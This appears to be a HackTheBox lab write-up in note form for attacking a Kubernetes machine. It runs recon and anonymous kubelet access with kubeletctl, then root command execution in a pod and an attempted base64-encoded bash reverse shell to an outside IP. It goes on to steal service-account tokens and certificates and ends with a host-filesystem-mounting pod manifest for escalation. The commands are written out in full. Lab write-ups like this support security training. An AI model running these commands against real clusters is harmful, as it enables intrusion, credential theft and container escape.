# recon
- **nmap -p- --min-rate 10000 -oA scans/nmap-alltcp  10.10.11.133**
- found seven open TCP ports, SSH (22), Kubernetes (2379, 2380, and 8443), and InfluxDB (10249, 10250, and 10256)
- **nmap -p 22,2379,2380,8443,10249,10250,10256 -sCV -oA scans/nmap-tcpscripts 10.10.11.133**
- Based on this [Doc](https://kubernetes.io/docs/reference/networking/ports-and-protocols/) not only are 2379 and 2380 a part of Kubernetes, but the ports that nmap labeled as InfluxDB are as well.
- Based on some of the names, this seems like an instance of minikube
- **Kubernetes manages large deployments of containers.**
- TCP 8443 is the main API server for the cluster
- A kubelet is an agent running on each node that controls it, and typically listens on TCP 10250
 ![kub](https://github.com/Islamkafafy123/HackTheBox/blob/main/pictures/kub.png)
- Visiting the service in Firefox returns an HTTP 403 with a JSON body
- a message says The anonymous user can’t /
- kubectl prompts for auth so deadend
- There’s a tool like kubectl for kubelets, kubeletctl. After installing it based on the instructions from the README, I’ll try the pods command to list all the pods on the node.
- **kubeletctl pods -s 10.10.11.133**
- The runningpods command gives a bunch of JSON about the running pods: **kubeletctl runningpods -s 10.10.11.133**
- use jq to get a list of the name and namespace:
  - **kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'**
- There’s only one that’s not in the kube-system namespace.
# Shell
- ith access to the kubelet service, I can also run commands on the containers. I’ll use the exec command in kubeletctl, giving both the name of the pod (nginx) and the name of the container (nginx)
- **kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx**
- we are rood
- As root, I can read the user.txt in the /root directory
- **kubeletctl -s 10.10.11.133 exec "ls /root" -p nginx -c nginx**
- **kubeletctl -s 10.10.11.133 exec "ls /root/user.txt" -p nginx -c nginx**
- there is bash in the machine but it won’t do a bash reverse shell
- Thinking it might be bad characters, I tried encoded the reverse shell **echo "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" | base64 -w0**
- **kubeletctl -s 10.10.11.133 exec 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==" | base64 -d | bash' -p nginx -c nginx**
- It doesn’t seem to handle the pipes well and Neither curl nor wget seem to be in the container
- after several search It turns out there’s a much simpler way to get a shell - just issue the bash (or sh) command
- **kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx**
- We’re going to create our own highly privileged service account. First, we need to grab the token and cert
- **kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt**
- **kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token**
- To use kubectl, I’ll save the token in an environment variable, token (to save a lot of copy and pasting)
- **export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)**
- Now I can pass the ca.crt file and the token to kubectl and it doesn’t ask for a username and password
- **kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod**
- get pod returns information about the running pod!
- The auth can-i command in kubectl is used to see if a given account can take some action. With the -list flag, it will show all permissions
- **kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token**
- The important line is the third one, which says this account can get, create, and list pods
- I’ll grab the details of the current nginx container
- **kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token**
- There’s a ton of information here, but the two key parts I need:
   - namespace is default
   - image is nginx:1.14.2
- grab yaml file from prevous machine and upadate it for this scenario
- ```
  apiVersion: v1 
kind: Pod
metadata:
  name: 0xdf-pod
  namespace: default
spec:
  containers:
  - name: 0xdf-pod
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

